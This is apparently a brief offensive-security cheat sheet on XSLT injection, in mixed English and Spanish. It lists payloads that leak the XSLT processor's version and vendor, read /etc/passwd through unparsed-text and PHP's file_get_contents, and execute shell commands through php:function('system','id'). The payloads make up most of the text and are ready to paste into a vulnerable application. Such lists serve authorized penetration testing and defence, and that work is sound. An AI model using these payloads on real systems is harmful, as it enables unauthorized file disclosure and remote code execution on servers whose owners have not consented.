eXtensible Stylesheet Language Transformation (XSLT) is a language enabling the transformation of XML documents. For instance, it can select specific nodes from an XML document and change the XML structure.


## Identifying XSLT Injection

Si le metemos `<` y es vulnerable nos lanzará un error

## Information Disclosure

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

## LFI

Dependiendo de la version nos dara error o no

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

## RCE 

```xml
<xsl:value-of select="php:function('system','id')" />
```
